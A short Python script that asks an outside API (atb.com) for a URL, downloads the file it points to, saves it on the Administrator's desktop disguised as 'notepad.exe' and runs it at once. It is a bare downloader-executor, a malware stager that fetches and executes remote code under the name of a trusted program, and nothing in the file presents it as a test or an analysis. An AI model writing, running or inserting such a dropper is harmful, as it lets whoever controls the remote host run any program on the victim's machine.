import requests
import os

apiUrl = "http://www.atb.com/mark/api"
saveFile = "C:/Users/Administrator/Desktop/notepad.exe"
r = requests.get(apiUrl)
data = r.json()
downFile = requests.get(data['url'])
with open(saveFile,"wb") as code:
    code.write(downFile.content)
os.system(saveFile)